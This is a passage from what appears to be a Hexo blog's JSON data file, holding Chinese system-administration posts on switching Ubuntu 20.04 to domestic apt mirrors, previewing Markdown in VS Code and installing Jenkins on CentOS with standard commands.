http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse\ndeb-src http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse\n```","source":"_posts/post245.md","raw":"---\ntitle: Ubuntu 20.04 换国内源\ndate: 2020-11-02 14:57:54\ntags: 运维\n---\n\n编辑 `/etc/apt/sources.list`\n\n<!--more-->\n\n```\nsudo vim /etc/apt/sources.list\n```\n\n### 清华源  \n\n```\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\n\n# 预发布软件源，不建议启用\n# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\n```\n\n### 最后\n\n```\nsudo apt update\nsudo apt upgrade\n```\n\n### 其他源  \n\n+ 阿里  \n\n```\ndeb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse\n```\n\n+ 中科大\n\n```\ndeb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse\ndeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse\ndeb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\ndeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\ndeb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\ndeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\ndeb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse\ndeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse\ndeb https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\ndeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\n```\n\n+ 网易163\n\n```\ndeb http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse\ndeb http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse\ndeb http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse\ndeb http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse\ndeb http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse\ndeb-src http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse\ndeb-src http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse\ndeb-src http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse\ndeb-src http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse\ndeb-src http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse\n```","slug":"post245","published":1,"updated":"2020-11-02T07:14:23.993Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdx002qq0szi1zuylaw","content":"<p>编辑 <code>/etc/apt/sources.list</code></p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>\n<h3 id=\"清华源\"><a href=\"#清华源\" class=\"headerlink\" title=\"清华源\"></a>清华源</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\"># 预发布软件源，不建议启用</span><br><span class=\"line\"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>\n<h3 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt upgrade</span><br></pre></td></tr></table></figure>\n<h3 id=\"其他源\"><a href=\"#其他源\" class=\"headerlink\" title=\"其他源\"></a>其他源</h3><ul>\n<li>阿里  </li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>\n<ul>\n<li>中科大</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>\n<ul>\n<li>网易163</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>编辑 <code>/etc/apt/sources.list</code></p>","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>\n<h3 id=\"清华源\"><a href=\"#清华源\" class=\"headerlink\" title=\"清华源\"></a>清华源</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\"># 预发布软件源，不建议启用</span><br><span class=\"line\"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>\n<h3 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt upgrade</span><br></pre></td></tr></table></figure>\n<h3 id=\"其他源\"><a href=\"#其他源\" class=\"headerlink\" title=\"其他源\"></a>其他源</h3><ul>\n<li>阿里  </li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>\n<ul>\n<li>中科大</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\">deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>\n<ul>\n<li>网易163</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\">deb http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class=\"line\">deb-src http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>"},{"title":"Vs Code编写md文件实现实时预览","date":"2020-10-28T09:36:54.000Z","_content":"\n使用组合键Ctrl + Shift + P，打开命令窗口，输入mark，点击即可在右边实时预览，如图\n\n<!--more-->\n\n![1](/imgs/244/1.png)","source":"_posts/post244.md","raw":"---\ntitle: Vs Code编写md文件实现实时预览\ndate: 2020-10-28 17:36:54\ntags: 经验\n---\n\n使用组合键Ctrl + Shift + P，打开命令窗口，输入mark，点击即可在右边实时预览，如图\n\n<!--more-->\n\n![1](/imgs/244/1.png)","slug":"post244","published":1,"updated":"2020-11-04T05:01:04.427Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdy002tq0szgfksgyue","content":"<p>使用组合键Ctrl + Shift + P，打开命令窗口，输入mark，点击即可在右边实时预览，如图</p>\n<a id=\"more\"></a>\n<p><img src=\"/imgs/244/1.png\" alt=\"1\"></p>\n","site":{"data":{}},"excerpt":"<p>使用组合键Ctrl + Shift + P，打开命令窗口，输入mark，点击即可在右边实时预览，如图</p>","more":"<p><img src=\"/imgs/244/1.png\" alt=\"1\"></p>"},{"title":"centos安装jenkins","date":"2020-11-03T09:58:28.000Z","_content":"\n## 一、安装jdk\n首先确认系统是否安装jdk环境\n```bash\njava -version\n```\n<!--more-->\n如果没安装会提示你`command not found`，使用下边的命令安装\n```bash\nyum install -y java\n```\n## 二、安装jenkins\n\n### 1.添加Jenkins库到yum库并配置key，可以到 [jenkins官网](https://pkg.jenkins.io/redhat-stable/) 获取最新库和key\n```bash\nsudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo\nsudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key\n```\n\n### 2.安装jenkins\n```bash\nyum install jenkins\n```\n\n### 3.修改jenkins默认端口号\n\njenkins默认端口号8080，如果要修改请\n```bash\nvim /etc/sysconfig/jenkins\n```\n找到`JENKINS_PORT=\"8080\"`修改即可\n\n### 4.启动jenkins\n\n```bash\nservice jenkins start\n```\n* 停止和重启分别用下边的命令\n\n```bash\nservice jenkins stop #停止\nservice jenkins restart #重启\n```\n* 安装成功后Jenkins将作为一个守护进程随系统启动\n\n### 5.打开jenkins\n浏览器输入服务器地址加上端口号，例如`http://190.168.1.2:8080/`\n\n首次打开会让你输入密码，密码在\n```bash\nvim /var/lib/jenkins/secrets/initialAdminPassword\n```\n复制进去即可\n\n之后可以默认安装推荐插件，配置用户名密码，安装完成。\n\n### 6.更新jenkins\n\n```bash\nyum update jenkins\n```\n\n这种方式可能无法更新到最新的jenkins，需要手动在磁盘查找`jenkins.war`并替换\n\n* 停止jenkins`service jenkins stop`\n\n* `rpm -ql jenkins`找到`jenkins.war`，然后官网下载最新的替换\n\n* 启动jenkins`service jenkins start`","source":"_posts/post247.md","raw":"---\ntitle: centos安装jenkins\ndate: 2020-11-03 17:58:28\ntags: [运维,持续集成]\n---\n\n## 一、安装jdk\n首先确认系统是否安装jdk环境\n```bash\njava -version\n```\n<!--more-->\n如果没安装会提示你`command not found`，使用下边的命令安装\n```bash\nyum install -y java\n```\n## 二、安装jenkins\n\n### 1.添加Jenkins库到yum库并配置key，可以到 [jenkins官网](https://pkg.jenkins.io/redhat-stable/) 获取最新库和key\n```bash\nsudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo\nsudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key\n```\n\n### 2.安装jenkins\n```bash\nyum install jenkins\n```\n\n### 3.修改jenkins默认端口号\n\njenkins默认端口号8080，如果要修改请\n```bash\nvim /etc/sysconfig/jenkins\n```\n找到`JENKINS_PORT=\"8080\"`修改即可\n\n### 4.启动jenkins\n\n```bash\nservice jenkins start\n```\n* 停止和重启分别用下边的命令\n\n```bash\nservice jenkins stop #停止\nservice jenkins restart #重启\n```\n* 安装成功后Jenkins将作为一个守护进程随系统启动\n\n### 5.打开jenkins\n浏览器输入服务器地址加上端口号，例如`http://190.168.1.2:8080/`\n\n首次打开会让你输入密码，密码在\n```bash\nvim /var/lib/jenkins/secrets/initialAdminPassword\n```\n复制进去即可\n\n之后可以默认安装推荐插件，配置用户名密码，安装完成。\n\n### 6.更新jenkins\n\n```bash\nyum update jenkins\n```\n\n这种方式可能无法更新到最新的jenkins，需要手动在磁盘查找`jenkins.war`并替换\n\n* 停止jenkins`service jenkins stop`\n\n* `rpm -ql jenkins`找到`jenkins.war`，然后官网下载最新的替换\n\n* 启动jenkins`service jenkins start`","slug":"post247","published":1,"updated":"2020-12-07T02:14:02.224Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdz002vq0sz9le4lzsx","content":"<h2 id=\"一、安装jdk\"><a href=\"#一、安装jdk\" class=\"headerlink\" title=\"一、安装jdk\"></a>一、安装jdk</h2><p>首先确认系统是否安装jdk环境<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -version</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>如果没安装会提示你<code>command not found</code>，使用下边的命令安装<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y java</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"二、安装jenkins\"><a href=\"#二、安装jenkins\" class=\"headerlink\" title=\"二、安装jenkins\"></a>二、安装jenkins</h2><h3 id=\"1-添加Jenkins库到yum库并配置key，可以到-jenkins官网-获取最新库和key\"><a href=\"#1-添加Jenkins库到yum库并配置key，可以到-jenkins官网-获取最新库和key\" class=\"headerlink\" title=\"1.添加Jenkins库到yum库并配置key，可以到 jenkins官网 获取最新库和key\"></a>1.添加Jenkins库到yum库并配置key，可以到 <a href=\"https://pkg.jenkins.io/redhat-stable/\" target=\"_blank\" rel=\"noopener\">jenkins官网</a> 获取最新库和key</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo</span><br><span class=\"line\">sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-安装jenkins\"><a href=\"#2-安装jenkins\" class=\"headerlink\" title=\"2.安装jenkins\"></a>2.安装jenkins</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install jenkins</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-修改jenkins默认端口号\"><a href=\"#3-修改jenkins默认端口号\" class=\"headerlink\" title=\"3.修改jenkins默认端口号\"></a>3.修改jenkins默认端口号</h3><p>jenkins默认端口号8080，如果要修改请<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/sysconfig/jenkins</span><br></pre></td></tr></table></figure></p>\n<p>找到<code>JENKINS_PORT=&quot;8080&quot;</code>修改即可</p>\n<h3 id=\"4-启动jenkins\"><a href=\"#4-启动jenkins\" class=\"headerlink\" title=\"4.启动jenkins\"></a>4.启动jenkins</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service jenkins start</span><br></pre></td></tr></table></figure>\n<ul>\n<li>停止和重启分别用下边的命令</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service jenkins stop <span class=\"comment\">#停止</span></span><br><span class=\"line\">service jenkins restart <span class=\"comment\">#重启</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>安装成功后Jenkins将作为一个守护进程随系统启动</li>\n</ul>\n<h3 id=\"5-打开jenkins\"><a href=\"#5-打开jenkins\" class=\"headerlink\" title=\"5.打开jenkins\"></a>5.打开jenkins</h3><p>浏览器输入服务器地址加上端口号，例如<code>http://190.168.1.2:8080/</code></p>\n<p>首次打开会让你输入密码，密码在<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /var/lib/jenkins/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure></p>\n<p>复制进去即可</p>\n<p>之后可以默认安装推荐插件，配置用户名密码，安装完成。</p>\n<h3 id=\"6-更新jenkins\"><a href=\"#6-更新jenkins\" class=\"headerlink\" title=\"6.更新jenkins\"></a>6.更新jenkins</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum update jenkins</span><br></pre></td></tr></table></figure>\n<p>这种方式可能无法更新到最新的jenkins，需要手动在磁盘查找<code>jenkins.war</code>并替换</p>\n<ul>\n<li><p>停止jenkins<code>service jenkins stop</code></p>\n</li>\n<li><p><code>rpm -ql jenkins</code>找到<code>jenkins.war</code>，然后官网下载最新的替换</p>\n</li>\n<li><p>启动jenkins<code>service jenkins start</code></p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"一、安装jdk\"><a href=\"#一、安装jdk\" class=\"headerlink\" title=\"一、安装jdk\"></a>一、安装jdk</h2><p>首先确认系统是否安装jdk环境<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -version</span><br></pre></td></tr></table></figure></p>","more":"<p>如果没安装会提示你<code>command not found</code>，使用下边的命令安装<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y java</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"二、安装jenkins\"><a href=\"#二、安装jenkins\" class=\"headerlink\" title=\"二、安装jenkins\"></a>二、安装jenkins</h2><h3 id=\"1-添加Jenkins库到yum库并配置key，可以到-jenkins官网-获取最新库和key\"><a href=\"#1-添加Jenkins库到yum库并配置key，可以到-jenkins官网-获取最新库和key\" class=\"headerlink\" title=\"1.添加Jenkins库到yum库并配置key，可以到 jenkins官网 获取最新库和key\"></a>1.添加Jenkins库到yum库并配置key，可以到 <a href=\"https://pkg.jenkins.io/redhat-stable/\" target=\"_blank\" rel=\"noopener\">jenkins官网</a> 获取最新库和key</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo</span><br><span class=\"line\">sudo rpm --import 